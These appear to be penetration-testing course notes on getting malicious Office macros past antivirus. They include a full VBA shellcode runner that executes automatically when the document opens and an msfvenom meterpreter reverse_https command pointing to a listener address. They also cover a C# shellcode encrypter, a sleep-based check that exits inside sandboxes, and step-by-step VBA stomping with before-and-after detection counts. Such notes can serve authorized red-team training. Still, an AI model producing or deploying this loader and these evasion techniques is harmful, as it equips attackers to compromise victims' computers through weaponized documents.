# TOC

+ [bypassing-antivirus-in-vba](https://github.com/B4l3rI0n/OSEP/new/main/AV-Evasion#bypassing-antivirus-in-vba)
+ [full-code](https://github.com/B4l3rI0n/OSEP/new/main/AV-Evasion#full-code)
+ [vba-stomping--microsoft-word-macro-evasion](https://github.com/B4l3rI0n/OSEP/new/main/AV-Evasion#vba-stomping--microsoft-word-macro-evasion)


# **Bypassing Antivirus in VBA**

VBA (Visual Basic for Applications) is commonly abused in **malicious Office documents** (Word, Excel, etc.) to execute shellcode. 

However, antivirus (AV) products heavily scan and monitor this vector. To bypass detection, we use **encryption + heuristic evasion techniques**

---

## 🔹 1. The Basic VBA Shellcode Runner

**Core workflow:**

1. Store payload (shellcode) inside VBA as a byte array (`buf`).
2. Allocate memory with `VirtualAlloc`.
3. Copy shellcode into allocated memory (`RtlMoveMemory`).
4. Start execution with `CreateThread`.
5. Automatically run on document open (`Document_Open` or `AutoOpen`).

**Code snippet:**

```visual-basic
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

End Function
```

🔎 Detection: **7/26 AV engines flagged it** (signatures + behavior).

---

## 🔹 2. Encrypting the Shellcode (Caesar Cipher)

To evade **static signature scanning**, shellcode is **encrypted** and only decrypted at runtime.

### Encryption (done in C# before embedding into VBA)

```csharp
byte[] encoded = new byte[buf.Length];
for (int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}

uint counter = 0;

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach (byte b in encoded)
{
    hex.AppendFormat("{0:D}, ", b);
    counter++;
    if (counter % 50 == 0)
    {
        hex.AppendFormat("_{0}", Environment.NewLine);
    }
}
Console.WriteLine("The payload is: " + hex.ToString());

```

- Each byte shifted by +2 (`& 0xFF` ensures byte range).
- Output formatted for **VBA array insertion** (comma-separated, line breaks every 50 bytes).

---

### Decryption (runtime in VBA)

```vbnet
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i
```

- Each byte shifted back by -2.
- Restores the original shellcode just before execution.

✅ Benefit: Avoids AV static signatures.

❌ Still may be caught by behavior detection (running shellcode in Word is suspicious).

---

## 🔹 3. Time-Lapse Evasion (Sleep Check)

To bypass **heuristic emulation**, we use a **Sleep-based timer check**.

### Implementation in VBA

```visual-basic
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
...
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    Exit Function
End If
```

**How it works:**

- Sandbox/AV emulators **fast-forward Sleep** to save time.
- If less than 2 seconds elapsed → assume emulator → exit safely.
- If ≥ 2 seconds → running on real system → continue execution.

✅ Effective in C#.

❌ In VBA, **detection unchanged (7/26)** → AV relies on **signature scanning** for Office macros.

---

## 🔹 4. Detection Results & Limitations

- **Unencrypted VBA runner:** flagged by 7 AVs.
- **Encrypted + Decryption:** still flagged (AVs catch common VBA stagers).
- **Time-lapse heuristic bypass:** no improvement (7 AVs).

💡 **Reason:** Office macros are a well-known attack vector → AV vendors heavily invest in detection → signatures are stronger.

Unlike C#, where heuristic evasion lowered detections, **VBA remains high-risk** because:

- Common attack vector.
- Heavily signatured by AV.
- Even obfuscation/encryption provides limited relief.

---

## 🔹 Visual Flow (Quick Review Map)


<img width="1620" height="2754" alt="_- visual selection (3)" src="https://github.com/user-attachments/assets/9649e367-cfd9-4b51-8028-c80085d3b85e" />


---

# Full code

1. Shellcode
    
    ```visual-basic
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.2.142 LPORT=4444 -f csharp
    ```
    
2. Encrypter 
    
    ```csharp
    using System;
    using System.IO;
    using System.Text;
    
    namespace Encrypter
    {
        class Program
        {
            static void Main(string[] args)
            {
                byte[] buf;
    
                if (args.Length == 0)
                {
                    Console.WriteLine("Usage:");
                    Console.WriteLine("  Encrypter.exe <shellcode.txt | raw bytes>");
                    Console.WriteLine("Example (file): Encrypter.exe shellcode.txt");
                    Console.WriteLine("Example (inline): Encrypter.exe 0xfc,0x48,0x83,0xe4,0xf0");
                    return;
                }
    
                // 🔹 Option 1: Read from file if argument is a file
                if (File.Exists(args[0]))
                {
                    string fileContent = File.ReadAllText(args[0]).Trim();
                    buf = ParseShellcode(fileContent);
                }
                else
                {
                    // 🔹 Option 2: Treat argument as inline shellcode string
                    buf = ParseShellcode(args[0]);
                }
    
                // 🔹 Encrypt shellcode
                byte[] encoded = new byte[buf.Length];
                for (int i = 0; i < buf.Length; i++)
                {
                    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                }
    
                // 🔹 Print in Visual Basic–style decimal format
                uint counter = 0;
                StringBuilder vbPayload = new StringBuilder(encoded.Length * 4);
                foreach (byte b in encoded)
                {
                    vbPayload.AppendFormat("{0:D}, ", b);
                    counter++;
                    if (counter % 50 == 0)
                    {
                        vbPayload.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
    
                // Remove trailing comma and space if needed
                if (vbPayload.Length >= 2)
                {
                    vbPayload.Length -= 2;
                }
    
                Console.WriteLine("Encrypted Payload (VB-style):\n" + vbPayload.ToString());
            }
    
            // Helper: Parse shellcode string (e.g., "0xfc,0x48,0x83")
            static byte[] ParseShellcode(string input)
            {
                string[] parts = input.Split(new char[] { ',', ' ', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
                byte[] result = new byte[parts.Length];
    
                for (int i = 0; i < parts.Length; i++)
                {
                    result[i] = Convert.ToByte(parts[i].Replace("0x", ""), 16);
                }
    
                return result;
            }
        }
    }
    
    ```
    
3. VBA loader
    
    ```visual-basic
    ' --- Windows API Imports ---
    Private Declare PtrSafe Function CreateThread Lib "KERNEL32" ( _
        ByVal SecurityAttributes As Long, _
        ByVal StackSize As Long, _
        ByVal StartFunction As LongPtr, _
        ThreadParameter As LongPtr, _
        ByVal CreateFlags As Long, _
        ByRef ThreadId As Long) As LongPtr
    
    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ( _
        ByVal lpAddress As LongPtr, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As LongPtr
    
    Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" ( _
        ByVal lDestination As LongPtr, _
        ByRef sSource As Any, _
        ByVal lLength As Long) As LongPtr
    
    Private Declare PtrSafe Sub Sleep Lib "KERNEL32" ( _
        ByVal mili As Long)
    
    Function mymacro()
        Dim buf As Variant
        Dim addr As LongPtr
        Dim counter As Long
        Dim data As Long
        Dim res As Long
        Dim i As Long
        
        ' --- Encrypted shellcode (Caesar +2) ---
        buf = Array(254, 132, 2, 2, 2, 98, 139, 231, 51, 194, 102, _
                    141, 82, 50, 141, 84, 14, 141, 84, 22, 141, 116, _
                    42, 17, 185, 76, 40, 51, 1, 174, 62, 99, ...) 
        ' (truncated for notes, full payload goes here)
    
        ' --- Time-lapse Evasion (Sleep Check) ---
        Dim t1 As Date, t2 As Date, elapsed As Long
        t1 = Now()
        Sleep (2000)             ' Sleep 2 seconds
        t2 = Now()
        elapsed = DateDiff("s", t1, t2)
        If elapsed < 2 Then Exit Function   ' Exit in sandbox
    
        ' --- Runtime Decryption (Caesar -2) ---
        For i = 0 To UBound(buf)
            buf(i) = buf(i) - 2
        Next i
    
        ' --- Allocate Memory & Copy Decrypted Shellcode ---
        addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
        For counter = LBound(buf) To UBound(buf)
            data = buf(counter)
            res = RtlMoveMemory(addr + counter, data, 1)
        Next counter
    
        ' --- Execute Payload ---
        res = CreateThread(0, 0, addr, 0, 0, 0)
    
    End Function
    
    ' --- Auto-run triggers when document opens ---
    Sub Document_Open()
        mymacro
    End Sub
    
    Sub AutoOpen()
        mymacro
    End Sub
    
    ```
    
---

# **VBA Stomping – Microsoft Word Macro Evasion**

## 1. **Office File Formats**

- **Old formats** (`.doc`, `.xls`) → use *Compound File Binary Format* (CFBF), a proprietary container.
- **Modern formats** (`.docm`, `.xlsm`) → ZIP-based archives (can be unpacked with 7zip).
- **Macro storage**:
    - Old files: stored in **OLE Compound File** → viewable with tools like **FlexHEX**.
    - Modern files: macro-related content inside **`vbaProject.bin` file inside the zipped archive.**.

---

## 2. **Inspecting Macros with FlexHEX**

- Open `.doc` in **FlexHEX** → `File > Open > OLE Compound File`.
    
    <img width="435" height="358" alt="image" src="https://github.com/user-attachments/assets/1fc6d043-30fc-404a-8b3c-631fadc9a41b" />

    
- Navigate to **Macros** folder → reveals embedded VBA code & metadata.
    
    <img width="284" height="278" alt="image" src="https://github.com/user-attachments/assets/cae6ed8e-e285-4bfa-9cf4-f4fd847c6188" />

    
- Key files:
    - **PROJECT** → determines which macros are shown in VBA editor (`Module=NewMacros` entry).
        
        <img width="647" height="254" alt="image" src="https://github.com/user-attachments/assets/ab2065b5-f412-4b6a-8593-6453ad8409c7" />

        
    - **NewMacros** → contains both:
        - **P-code (PerformanceCache)** → compiled VBA code.
        - **CompressedSourceCode** → textual VBA source (partially compressed).

---

## 3. **Hiding Macros in the VBA Editor**

- If we **null out** (`Insert Zero Block`) the `Module=NewMacros` string in **PROJECT**, macros won’t appear in VBA editor.
    
    This is done by highlighting the ASCII string and navigating to *Edit* > *Insert Zero Block*
    
    <img width="287" height="157" alt="image" src="https://github.com/user-attachments/assets/9f8fce45-444f-49dd-988d-b1954e3c7327" />

    
- **BUT**: AV detection is unchanged → macro still exists & executes.
    
    This helps prevent manual detection, but not AV tools, view from the Office VBA editor before editing on the left and the result of the edit on the right side.
    
    <img width="373" height="117" alt="image" src="https://github.com/user-attachments/assets/37520d11-d9bd-41d9-9f4c-b0ef8f29481e" />

    

---

## 4. **Understanding P-code (PerformanceCache)**

- **What is P-code?**
    - Pre-compiled version of VBA source code, cached for the specific **Office version** it was created on.
    - Present in both _VBA_PROJECT and NewMacros
    - Runs directly when the document is opened on the **same Office version & edition** (e.g., Office 2016, 32-bit, using `VBE7.DLL`).
        
        <img width="727" height="242" alt="image" src="https://github.com/user-attachments/assets/7f97fd65-d6e5-4abc-ab7b-9d652a0be537" />

        
- If opened on **different Office version** → P-code ignored, interpreter falls back to **textual VBA source**.
    - Scrolling towards the bottom of NewMacros, we find a partially-compressed version of the VBA source code
        
        <img width="730" height="313" alt="image" src="https://github.com/user-attachments/assets/52670f9a-59d2-4a32-a818-2db40d4efabd" />

        
    - Microsoft Word determines the version and edition a specific document was created with a clue lies at the beginning of the _VBA_PROJECT file
        
        <img width="730" height="540" alt="image" src="https://github.com/user-attachments/assets/cdca3b0d-a189-497a-86a5-f97935531a22" />

        
        compiled for Office 16. This indicates Microsoft Office 2016, which uses VBE7.DLL and is installed in the 32-bit version folder (C:\Program Files(x86)). 
        
        As long as our document is opened on a computer that uses the same version of Microsoft Word installed in the default location, the VBA source code is ignored and the P-code is executed instead. This means that in some scenarios, the VBA source code can be removed, which could certainly help us bypass detection.
        

---

## 5. **VBA Stomping Technique**

- **Goal:** Remove textual VBA source, leaving only compiled **P-code**.
- Steps:
    1. In **NewMacros**, locate ASCII string `"Attribute VB_Name = NewMacros"`.
    2. Select everything **after that point** (the source code region).
        - mark the bytes that start with the ASCII characters "Attribute VB_Name"
            
            <img width="690" height="227" alt="image" src="https://github.com/user-attachments/assets/d854bebf-ca6a-4a85-be30-c9a43e835831" />

            
        - The end of the p-code will be the very last byte
            
            <img width="690" height="227" alt="image" src="https://github.com/user-attachments/assets/25e864a1-0b35-4ac6-8fb2-ba47cfda49a5" />

            
    3. Replace it with **null bytes** (`Insert Zero Block`).
        
        With the VBA source code selected, we'll navigate to *Edit* > *Insert Zero Block* and accept the size of modifications.

        <img width="692" height="224" alt="image" src="https://github.com/user-attachments/assets/7c5d7578-a296-47bb-ba97-247c1d1b936a" />

        
        
    4. Save & close FlexHEX → recompress document.
- **Result:**
    - Opening doc → VBA editor looks **empty**.
        
        <img width="584" height="407" alt="image" src="https://github.com/user-attachments/assets/50524928-b2f8-4e45-b5ef-9fbe4406248d" />

        
    - Execution → still works (P-code runs).
    - Word **decompiles P-code back** into VBA editor at runtime (code reappears).
        
        <img width="668" height="315" alt="image" src="https://github.com/user-attachments/assets/8d183c94-ec40-46bd-ad07-1035fd172909" />

        

---

## 6. **Detection Results**

- Before Stomping: **7 detections** (AntiScan.Me).
- After Stomping: **4 detections**.
- Shows **reduction in AV detection** since many AV engines only scan textual VBA, not P-code.
    
    <img width="1540" height="1216" alt="image" src="https://github.com/user-attachments/assets/b098f3af-93db-4948-8bec-7f879ebb6c13" />

---

## 7. **Key Takeaways**

- VBA Stomping = **removing VBA source code** while relying on **P-code execution**.
- Benefits:
    - Hides code in VBA editor (harder for manual inspection).
    - Evades some AV products (signature-based).
- Risks:
    - Must match correct Office version/edition → otherwise execution fails.
- Trend:
    - Few AVs inspect P-code → relatively new evasion technique.
    - Potential for more undiscovered bypasses due to **undocumented file format parts**.
